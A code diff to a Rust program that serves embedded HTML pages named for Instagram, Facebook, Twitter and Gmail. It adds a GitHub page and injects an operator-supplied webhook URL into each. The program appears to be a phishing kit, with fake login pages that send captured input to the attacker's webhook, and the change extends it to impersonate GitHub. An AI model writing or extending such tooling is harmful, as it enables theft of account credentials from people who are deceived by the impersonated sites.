@@ -13,6 +13,7 @@ const INSTAGRAM_PAGE: &str =  include_str!("pages/instagram.html");
 const FACEBOOK_PAGE: &str =  include_str!("pages/facebook.html");
 const TWITTER_PAGE: &str = include_str!("pages/twitter.html");
 const GMAIL_PAGE: &str = include_str!("pages/gmaill.html");
+const GITHUB_PAGE: &str = include_str!("pages/github.html");
 
 
 
@@ -115,6 +116,7 @@ fn page(platform: &str, webhook_url: &str) -> String {
         "facebook" => FACEBOOK_PAGE.replace("{{DS-HOOK}}", webhook_url),
         "twitter" => TWITTER_PAGE.replace("{{DS-HOOK}}", webhook_url),
         "gmail" => GMAIL_PAGE.replace("{{DS-HOOK}}", webhook_url),
+        "github" => GITHUB_PAGE.replace("{{DS-HOOK}}", webhook_url),
         _ => BASIC_PAGE.replace("{{DS-HOOK}}", webhook_url),
     }
 }
